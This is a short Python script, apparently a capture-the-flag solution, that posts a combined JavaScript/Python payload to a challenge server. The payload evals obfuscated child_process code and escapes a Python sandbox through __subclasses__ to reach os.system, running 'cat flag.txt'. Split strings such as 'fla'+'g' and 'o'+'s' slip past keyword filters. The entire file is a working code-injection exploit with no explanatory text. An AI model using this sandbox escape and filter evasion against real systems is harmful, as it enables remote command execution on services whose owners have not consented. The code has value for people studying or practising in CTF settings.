import requests

js = 'lambda:eval(\"req\"+\"uire(\\"child_p\"+\"rocess\\").exec(\\"cat fla\\"+\\"g.txt\\").stdout.pipe(pr\"+\"ocess.stdout)\")'

py = "getattr([cls for cls in ().__class__.__base__.__subclasses__() if 'o'+'s._wrap_close' in str(cls)][0].__init__.__globals__['sys'].modules['o'+'s'], 'syste'+'m')('cat fla'+'g.txt')"

res = requests.post(
    "http://chal.h4c.cddc2025.xyz:13273/challenge",
    headers={
        "Content-Type": "application/json"
    },
    json={
        "payload": f"{js};0//{py}"
    }
)

print(res.text)